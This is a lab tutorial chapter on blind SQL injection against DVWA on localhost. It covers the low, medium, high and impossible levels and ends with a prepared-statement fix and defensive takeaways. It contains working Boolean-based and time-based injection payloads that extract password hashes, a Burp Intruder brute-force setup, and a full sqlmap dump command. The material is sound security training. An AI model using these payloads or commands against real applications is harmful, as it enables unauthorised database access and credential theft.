# Chapter 08 — Blind SQL Injection (DVWA Module: SQL Injection (Blind))

## Objective
Extract data with no direct query output — only a binary "User ID exists" / "not found" response — using **Boolean-based** and **time-based** blind techniques, automated with Burp Intruder and `sqlmap`.

## Prerequisites
- Target: `http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#`

---

## 🟢 LOW

### Source logic
```php
$id = $_REQUEST[ 'id' ];
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
if (mysqli_num_rows($result) == 1) { echo "User ID exists"; }
else { echo "User ID is MISSING from the database."; }
```
Only a boolean existence message is returned — no data reflected.

### Boolean-based extraction (Burp Repeater)
```
id=1' AND '1'='1          → "User ID exists"
id=1' AND '1'='2          → "User ID is MISSING..."
```
Confirms injection. Extract DB version character-by-character:
```
id=1' AND SUBSTRING(database(),1,1)='d' AND '1'='1
id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 77 AND '1'='1
```

### Time-based extraction (when no visible difference exists)
```
id=1' AND IF(1=1, SLEEP(5), 0)-- -
id=1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='5', SLEEP(5), 0)-- -
```
Measure response time in Burp's Repeater timer.

### Automating with Burp Intruder
1. Send the boolean payload to Intruder: `id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1),§1§,1)='§a§`
2. Attack type: `Cluster bomb` (two positions: character index, guessed char).
3. Payload set 1: numbers `1-32` (position index). Payload set 2: characters `a-f0-9` (hex charset, since MD5 hashes).
4. Use **Grep - Match** on "User ID exists" to auto-flag correct guesses per row.

### sqlmap automation
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=<sessid>; security=low" \
  --technique=BT --dbms=mysql \
  -D dvwa -T users --dump
```

### Why it works
Same root cause as classic SQLi — unsanitized concatenation — but exploited via **inference** (true/false or timing) instead of direct output, since the response never echoes query results.

---

## 🟡 MEDIUM

### Source logic
```php
$id = $_POST[ 'id' ];   // now a dropdown-driven POST, and
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
```
Same weaknesses as Chapter 07 Medium: escaping handles quotes only.

### Burp Suite bypass
Since dropdown restricts to numeric-looking values client-side, intercept the POST in Burp and inject directly, using **numeric-context** payloads requiring no quotes:
```
id=1 AND SLEEP(5)
id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='5',SLEEP(5),0)
```

### Why the bypass works
Identical reasoning to Ch.07 Medium — escaping quotes is irrelevant when the injection context needs no quotes at all.

---

## 🔴 HIGH

### Source logic
Similar session-based indirection as Ch.07 High, plus a **query LIMIT / cookie-based tracking** intended to slow scripted attacks (DVWA High blind SQLi historically adds a `Cookie: id` tracking mechanism and stricter flow).

### Burp Suite exercise
1. Locate the actual parameter/cookie carrying the injectable value (may be a `Cookie: id=1` header rather than a URL param).
2. Repeat the boolean/time-based technique against that header value via Repeater — mark position in **Intruder → Positions** on the cookie value.
3. Confirm the same blind technique succeeds once the real sink is found.

### Why it's still risky
As with Ch.07, added indirection ≠ real parameterization. The vulnerable concatenation still exists wherever the value finally reaches the query.

---

## ⚪ IMPOSSIBLE

### Source logic
```php
$id = $_GET[ 'id' ];
$stmt = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
$stmt->bindParam( ':id', $id, PDO::PARAM_INT );
$stmt->execute();
```
Same prepared-statement fix as Ch.07 Impossible.

### Why the attack fails
Boolean/time-based inference relies on injected SQL logic (`AND`, `SLEEP()`, `IF()`) being parsed as **executable SQL**. With bound parameters, the entire input is treated as a literal value — `SLEEP(5)` becomes a harmless string compared against `user_id`, never executed as a function call.

### Burp Suite exercise
Time every request with the same time-based payloads — response time stays constant regardless of payload, proving no SQL logic execution occurs.

---

## Root Cause Analysis
Blind SQLi is not a *different vulnerability* from classic SQLi — it's the same root cause (string concatenation into SQL) exploited through **inference channels** (boolean state, timing) when direct output is suppressed. The fix is identical: parameterized queries.

## Defensive Takeaways
- Parameterized queries defeat both classic and blind SQLi identically — there's no "safe from Blind SQLi but not classic SQLi."
- Avoid leaking internal state through *any* observable channel (response text, timing, HTTP status codes, error messages) tied to unsanitized input.
- Enable query timeouts/rate-limiting to blunt time-based enumeration as defense-in-depth.

---
⬅ [Back: SQL Injection](07-sql-injection.md) | ➡ [Next: Weak Session IDs](09-weak-session-ids.md)
